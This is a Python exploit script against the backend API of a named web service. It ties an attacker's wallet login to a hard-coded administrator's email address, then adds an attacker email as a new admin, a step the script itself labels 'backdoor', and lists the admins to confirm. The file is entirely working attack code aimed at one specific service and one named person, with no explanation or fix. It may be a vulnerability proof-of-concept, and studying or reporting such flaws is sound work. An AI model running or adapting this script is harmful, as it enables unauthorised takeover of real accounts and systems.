#!/usr/bin/env python3
import json
import urllib.request
import urllib.error

BASE_URL           = "https://app.nabu.pro/api/backend"
BE_JWT             = ""
PRIVY_ACCESS_TOKEN = ""
PRIVY_USER_ID      = ""
PRIVY_WALLET_ID    = ""
PRIVY_ADDRESS      = ""
ATTACKER_EMAIL     = ""
TARGET_ADMIN_EMAIL = "boris@pelagos.network"


def req(method, path, body=None):
    data = json.dumps(body).encode() if body is not None else b""
    r = urllib.request.Request(
        BASE_URL + path, data=data, method=method,
        headers={"Authorization": f"Bearer {BE_JWT}", "Content-Type": "application/json"},
    )
    try:
        with urllib.request.urlopen(r, timeout=10) as resp:
            return resp.status, resp.read().decode()
    except urllib.error.HTTPError as e:
        return e.code, e.read().decode()


def link(email):
    return req("POST", "/v1/trading-wallet/link", {
        "privy_user_id": PRIVY_USER_ID,
        "privy_wallet_id": PRIVY_WALLET_ID,
        "privy_address": PRIVY_ADDRESS,
        "privy_access_token": PRIVY_ACCESS_TOKEN,
        "google_email": email,
        "chain_id": 1,
    })


s, b = req("POST", "/v1/admin/admins", {})
print(f"baseline:  {s}")

s, b = link(TARGET_ADMIN_EMAIL)
print(f"exploit:   {s}")

s, b = req("POST", "/v1/admin/admins", {"email": ATTACKER_EMAIL})
print(f"backdoor:  {s}  {b.strip()}")

s, b = req("GET", "/v1/admin/admins")
print(f"admins:    {s}  {b.strip()}")

